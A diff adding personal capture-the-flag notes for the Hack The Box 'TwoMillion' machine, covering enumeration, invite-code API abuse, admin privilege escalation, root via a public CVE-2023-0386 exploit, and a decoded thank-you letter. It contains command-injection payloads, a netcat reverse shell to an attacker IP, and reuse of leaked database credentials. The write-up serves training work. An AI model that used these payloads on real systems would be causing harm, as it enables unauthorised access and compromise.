@@ -1,0 +1,238 @@
+Start: 
+
+Goals: 
+- Get user flag
+- Get root flag
+
+
+Enumeration:
+1. Ran nmap -sC -sV -oA initial_scan_two_million [ip]
+    - returned open port 22, 80
+    - 22: open ssh version 8.9p1 for Ubuntu Linux, pretty sure that's the OS.
+    - 80: open nginx http server, http-title returns Did not follow redirect to http://2million.htb/
+
+2. Ran nmap -sC -sV -p- -oA full_scan_two_million [ip]
+    - didn't return any new information
+
+3. Ran nmap -sC -p [22,80] -oA script_scan_two_million [ip]
+    - no new information
+
+4. Lets check into the ssh, try ssh'ing into the ip with ssh [ip]
+    - connection but needs password, tried:
+        - admin, administrator, password, 1234
+            - no dice
+
+    - We'll leave ssh alone for now and look into http
+
+5. went to ip, redirected me to http://2million.htb but is having trouble connecting, can't view source code.
+
+6. lets run gobuster to try to get directories associated with this: gobuster dir -u 10.129.229.66 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+    - Ip isn't working so let's try the redirect instead this time.
+    gobuster dir -u http://2million.htb --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+        - didn't work, went back to original, excluded 301 redirect code with gobuster dir -u 10.129.229.66 -b 301 --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+        - this worked, scan proceeding
+        - nothing returned.
+
+7. added 2million.htb by going to /etc/hosts with sudo vi /etc/hosts and adding in 10.129.229.66    2million.htb under localhost
+8. go back to the webpage, now we can access it, in the meantime lets run our initial nmap scan again now that we have the host.
+9. There's a "login" tab at the top that takes us to a standard /login area , nothing in here so far.
+10. Got to a page /invite which prompts you to hack your way in. searched through the source code and didn't find anything in particular. gonna run gobuster again now that we have the redirects working
+    - nothing new
+11. Headed back to the /join page and checked the source code.
+    - found a js source code that looks to be related to invite verification, which is a POST request to the url /api/v1/invite/verify
+    - Opened the script and got:
+    `` eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))``
+    - Which is obfuscated js, so put it into: https://lelinhtinh.github.io/de4js/ and clicking "Auto Decode" and it spits out: 
+ function verifyInviteCode(code) {
+    var formData = {
+        "code": code
+    };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+
+- 12. That second function has a url that looks like you're supposed to send a POST request to it to generate an invite code.
+    -  So gonna try doing that with curl, quick google search for how to send POST requests in command line: curl -X POST 2million.htb/api/v1/invite/how/to/generate
+    -   success! returns: {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
+    -   Encrypted data, and there's also a datatype "enctype" which specifies ROT13, so we'll try to decrypt it with ROT13 in a ROT13 decrypter, quick google and it outputs: 
+    In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
+    
+- 13. Sending a new post request to the above specified endpoint: success, returns
+    - {"0":200,"success":1,"data":{"code":"UDRKWlotWTIzTzgtTzMxUzItUERXUEs=","format":"encoded"}}
+    - format is encoded, so this probably needs to be decoded first. tried ROT13 didn't work, let's find a general decoder on google.
+    - base 64 decoded: P4JZZ-Y23O8-O31S2-PDWPK , looks like an invite code to me, let's try it now by sending it into a post request at the first function, to the endpoint: '/api/v1/invite/verify'
+
+    curl -d 'code=P4JZZ-Y23O8-O31S2-PDWPK' 2million.htb/api/v1/invite/verify
+    Returns success, invite code is valid. So we should be able to just take this to /join and log in,
+
+- 14. Sent me to a sign up page, created an account, I am officially in. lets go, now to find the user flag.
+I wonder if I can ssh in now with my new information? Nope.
+
+- 15. Found an "Access" page with a download link on it, checked the source code and found a reference to an api endpoint /api/v1/user/vpn/generate
+    - Gonna try to just hit the api end point and see if there are other api's associated.
+    - curl -v 2million.htb/api
+    - returned unauthorized, so we'll have to provide my cookies from my browser to authenticate
+    - Open browser developer tools, go to storage, grab PHPSESSID: e4sq0090oboluu91u9fq9ee3n8
+    - curl -sv 2million.htb/api --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+
+- 16. returned a new endpoint /api/v1 , gonna hit it the same way as above: curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - returns a ton of endpoints, including the initial generating an invite code, verifying an invide code, but also has some admin endpoints.
+    - "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+
+    - sent a quick request to the get curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        -  returned false, which is expected
+    
+    - sent another quick request to curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        - returned unauthorized
+    
+    - sent another quick request to curl -X PUT -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        - did not get an unauthorized, but did get invalid content type, as in we didn't specify good data to PUT
+        - updated the content type: curl -X PUT --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        - returned missing parameter: email
+        curl -X PUT --header "Content-Type: application/json" --data '{"email": "rami.hanin@gmail.com"}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+        - returns missing parameter: is_admin
+        curl -X PUT --header "Content-Type: application/json" --data '{"email": "rami.hanin@gmail.com", "is_admin": 1}' -sv 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+            - returns {
+                "id": 13,
+                "username": "testUser",
+                "is_admin": 1
+                }
+
+17. We're now an admin which is sick. let's check with the /api/v1/admin/auth endpoint curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - now returns true
+    
+
+18. going to try running the post to generate a vpn now, curl -X POST -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - invalid content type, lets update curl -X POST --header "Content-Type: application/json" -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" | jq
+    - missing param username: curl -X POST --header "Content-Type: application/json" --data '{"username": "testUser"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" 
+    - Generates a key
+
+19. Since this works, we're gonna try to see if we can use remote code injection since this is usually an admin only endpoint and maybe it's not very secure, instead of passing in a real username, let's pass in some php code AFTER the username, dilineating with ;
+    - system('id');
+    curl -X POST --header "Content-Type: application/json" --data '{"username": "test;id;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8" 
+    returns uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    remote code injection is a GO
+
+Gaining a Foothold:
+1. gonna replace id with rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 1234 >/tmp/f and run a listener with nc -lvnp 1234 on another terminal
+    - curl -X POST --header "Content-Type: application/json" --data '{"username": "test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 1234 >/tmp/f;"}' -sv 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e4sq0090oboluu91u9fq9ee3n8"
+    it works, terminal acquired.
+
+2. gonna clean it up and get updated TTY access with python3 -c 'import pty; pty.spawn("/bin/bash")'
+    - clean terminal www-data@2million
+
+3. Time to explore:
+    - ls -a to get all hidden files
+        - revealed a .env file that containes DB credentials:
+        DB_HOST=127.0.0.1
+        DB_DATABASE=htb_prod
+        DB_USERNAME=admin
+        DB_PASSWORD=SuperDuperPass123
+
+    - checking /etc/passwd for possible reuse:
+        - cat /etc/passwd 
+        - admin exists in here, so it's possible we can ssh with the above data 
+        - ssh admin@10.129.229.66 
+        - password: SuperDuperPass123
+
+    - we're in boys.
+
+4. quick check of the files and it reveals user.txt which gives us our first flag, lets go. goal 1 complete.
+
+
+Priviledge Escalation:
+1. on to getting the admin root, lets see if we have sudo access to anything fun 
+- sudo a
+- admin is not in the sudoers file, this incident will be reported.
+    - just triggered all the alarms, god damn it.
+
+2. There's a thing that says "You Have Mail" so let's check mail, /var/mail
+    - The mail in here asks for an update to the OS of the web host, some series Linux kernel CVEs have been found, one in particular noteworthy: OverlayFS / FUSE.
+
+3. Looking up OverlayFS / FUSE exploit gets us to a datadog link that indicates you can identify your linux kernel by using the command uname -r, anything that has a version number lower than 6.2 is vulnerable, let's verify.
+    - uname -r : 5.15.70-051570-generic
+    - lower than 6.2, we're vulnerable to this exploit
+
+4. Google search revealed the github link, https://github.com/xkaneiki/CVE-2023-0386.git , so we're gonna clone this to my home machine and then zip it to upload to our compromised machine.
+    - zip -r cve.zip CVE-2023-0386
+    - ran sudo python3 -m http.server 8080 on my home server with the cloned repo
+    - went to the compromised machine, ran wget http://10.10.14.20:8080/cve.zip
+    10.10.14.20
+    - didn't work, permission denied, but we can try another way.
+
+5. Use SCP to upload straight to the SSH server:
+    scp cve.zip admin@2million.htb:/tmp
+    enter password above: SuperDuperPass123
+    go to /tmp folder, cve.zip is here, lets unzip it.
+    unzip cve.zip
+
+6. Running the commands that are in the github readme
+ - make all
+ - ./fuse ./ovlcap/lower ./gc &
+ - ./exp
+
+ 7. root access acquired.
+ 8. Navigate to the root file, there's the root flag, but also a thank_you.json file with {"encoding": "url", "data": "%7B%22encoding%22:%20%22hex%22,%20%22data%22:%20%227b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d%22%7D"}
+
+ url decoding, let's try to break this rq. 
+
+ using https://gchq.github.io/CyberChef/
+
+ gets us: 
+{"encoding": "hex", "data": "7b22656e6372797074696f6e223a2022786f72222c2022656e6372707974696f6e5f6b6579223a20224861636b546865426f78222c2022656e636f64696e67223a2022626173653634222c202264617461223a20224441514347585167424345454c43414549515173534359744168553944776f664c5552765344676461414152446e51634454414746435145423073674230556a4152596e464130494d556745596749584a51514e487a7364466d494345535145454238374267426942685a6f4468595a6441494b4e7830574c526844487a73504144594848547050517a7739484131694268556c424130594d5567504c525a594b513848537a4d614244594744443046426b6430487742694442306b4241455a4e527741596873514c554543434477424144514b4653305046307337446b557743686b7243516f464d306858596749524a41304b424470494679634347546f4b41676b344455553348423036456b4a4c4141414d4d5538524a674952446a41424279344b574334454168393048776f334178786f44777766644141454e4170594b67514742585159436a456345536f4e426b736a41524571414130385151594b4e774246497745636141515644695952525330424857674f42557374427842735a58494f457777476442774e4a30384f4c524d61537a594e4169734246694550424564304941516842437767424345454c45674e497878594b6751474258514b45437344444767554577513653424571436c6771424138434d5135464e67635a50454549425473664353634c4879314245414d31476777734346526f416777484f416b484c52305a5041674d425868494243774c574341414451386e52516f73547830774551595a5051304c495170594b524d47537a49644379594f4653305046776f345342457454776774457841454f676b4a596734574c4545544754734f414445634553635041676430447863744741776754304d2f4f7738414e6763644f6b31444844464944534d5a48576748444267674452636e4331677044304d4f4f68344d4d4141574a51514e48335166445363644857674944515537486751324268636d515263444a6745544a7878594b5138485379634444433444433267414551353041416f734368786d5153594b4e7742464951635a4a41304742544d4e525345414654674e4268387844456c6943686b7243554d474e51734e4b7745646141494d425355644144414b48475242416755775341413043676f78515241415051514a59674d644b524d4e446a424944534d635743734f4452386d4151633347783073515263456442774e4a3038624a773050446a63634444514b57434550467734344241776c4368597242454d6650416b5259676b4e4c51305153794141444446504469454445516f36484555684142556c464130434942464c534755734a304547436a634152534d42484767454651346d45555576436855714242464c4f7735464e67636461436b434344383844536374467a424241415135425241734267777854554d6650416b4c4b5538424a785244445473615253414b4553594751777030474151774731676e42304d6650414557596759574b784d47447a304b435364504569635545515578455574694e68633945304d494f7759524d4159615052554b42446f6252536f4f4469314245414d314741416d5477776742454d644d526f6359676b5a4b684d4b4348514841324941445470424577633148414d744852566f414130506441454c4d5238524f67514853794562525459415743734f445238394268416a4178517851516f464f676354497873646141414e4433514e4579304444693150517a777853415177436c67684441344f4f6873414c685a594f424d4d486a424943695250447941414630736a4455557144673474515149494e7763494d674d524f776b47443351634369554b44434145455564304351736d547738745151594b4d7730584c685a594b513858416a634246534d62485767564377353043776f334151776b424241596441554d4c676f4c5041344e44696449484363625744774f51776737425142735a5849414242454f637874464e67425950416b47537a6f4e48545a504779414145783878476b6c694742417445775a4c497731464e5159554a45454142446f6344437761485767564445736b485259715477776742454d4a4f78304c4a67344b49515151537a734f525345574769305445413433485263724777466b51516f464a78674d4d41705950416b47537a6f4e48545a504879305042686b31484177744156676e42304d4f4941414d4951345561416b434344384e467a464457436b50423073334767416a4778316f41454d634f786f4a4a6b385049415152446e514443793059464330464241353041525a69446873724242415950516f4a4a30384d4a304543427a6847623067344554774a517738784452556e4841786f4268454b494145524e7773645a477470507a774e52516f4f47794d3143773457427831694f78307044413d3d227d"}
+
+2nd layer of decoding, this time in hex:
+
+{"encryption": "xor", "encrpytion_key": "HackTheBox", "encoding": "base64", "data": "DAQCGXQgBCEELCAEIQQsSCYtAhU9DwofLURvSDgdaAARDnQcDTAGFCQEB0sgB0UjARYnFA0IMUgEYgIXJQQNHzsdFmICESQEEB87BgBiBhZoDhYZdAIKNx0WLRhDHzsPADYHHTpPQzw9HA1iBhUlBA0YMUgPLRZYKQ8HSzMaBDYGDD0FBkd0HwBiDB0kBAEZNRwAYhsQLUECCDwBADQKFS0PF0s7DkUwChkrCQoFM0hXYgIRJA0KBDpIFycCGToKAgk4DUU3HB06EkJLAAAMMU8RJgIRDjABBy4KWC4EAh90Hwo3AxxoDwwfdAAENApYKgQGBXQYCjEcESoNBksjAREqAA08QQYKNwBFIwEcaAQVDiYRRS0BHWgOBUstBxBsZXIOEwwGdBwNJ08OLRMaSzYNAisBFiEPBEd0IAQhBCwgBCEELEgNIxxYKgQGBXQKECsDDGgUEwQ6SBEqClgqBA8CMQ5FNgcZPEEIBTsfCScLHy1BEAM1GgwsCFRoAgwHOAkHLR0ZPAgMBXhIBCwLWCAADQ8nRQosTx0wEQYZPQ0LIQpYKRMGSzIdCyYOFS0PFwo4SBEtTwgtExAEOgkJYg4WLEETGTsOADEcEScPAgd0DxctGAwgT0M/Ow8ANgcdOk1DHDFIDSMZHWgHDBggDRcnC1gpD0MOOh4MMAAWJQQNH3QfDScdHWgIDQU7HgQ2BhcmQRcDJgETJxxYKQ8HSycDDC4DC2gAEQ50AAosChxmQSYKNwBFIQcZJA0GBTMNRSEAFTgNBh8xDEliChkrCUMGNQsNKwEdaAIMBSUdADAKHGRBAgUwSAA0CgoxQRAAPQQJYgMdKRMNDjBIDSMcWCsODR8mAQc3Gx0sQRcEdBwNJ08bJw0PDjccDDQKWCEPFw44BAwlChYrBEMfPAkRYgkNLQ0QSyAADDFPDiEDEQo6HEUhABUlFA0CIBFLSGUsJ0EGCjcARSMBHGgEFQ4mEUUvChUqBBFLOw5FNgcdaCkCCD88DSctFzBBAAQ5BRAsBgwxTUMfPAkLKU8BJxRDDTsaRSAKESYGQwp0GAQwG1gnB0MfPAEWYgYWKxMGDz0KCSdPEicUEQUxEUtiNhc9E0MIOwYRMAYaPRUKBDobRSoODi1BEAM1GAAmTwwgBEMdMRocYgkZKhMKCHQHA2IADTpBEwc1HAMtHRVoAA0PdAELMR8ROgQHSyEbRTYAWCsODR89BhAjAxQxQQoFOgcTIxsdaAAND3QNEy0DDi1PQzwxSAQwClghDA4OOhsALhZYOBMMHjBICiRPDyAAF0sjDUUqDg4tQQIINwcIMgMROwkGD3QcCiUKDCAEEUd0CQsmTw8tQQYKMw0XLhZYKQ8XAjcBFSMbHWgVCw50Cwo3AQwkBBAYdAUMLgoLPA4NDidIHCcbWDwOQwg7BQBsZXIABBEOcxtFNgBYPAkGSzoNHTZPGyAAEx8xGkliGBAtEwZLIw1FNQYUJEEABDocDCwaHWgVDEskHRYqTwwgBEMJOx0LJg4KIQQQSzsORSEWGi0TEA43HRcrGwFkQQoFJxgMMApYPAkGSzoNHTZPHy0PBhk1HAwtAVgnB0MOIAAMIQ4UaAkCCD8NFzFDWCkPB0s3GgAjGx1oAEMcOxoJJk8PIAQRDnQDCy0YFC0FBA50ARZiDhsrBBAYPQoJJ08MJ0ECBzhGb0g4ETwJQw8xDRUnHAxoBhEKIAERNwsdZGtpPzwNRQoOGyM1Cw4WBx1iOx0pDA=="}
+
+so we need to decode it with base64 then decrypt it with XOR key
+
+Dear HackTheBox Community,
+
+We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.
+
+From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.
+
+To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.
+
+Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.
+
+With deepest gratitude,
+
+The HackTheBox Team
+
+Very sweety pie.
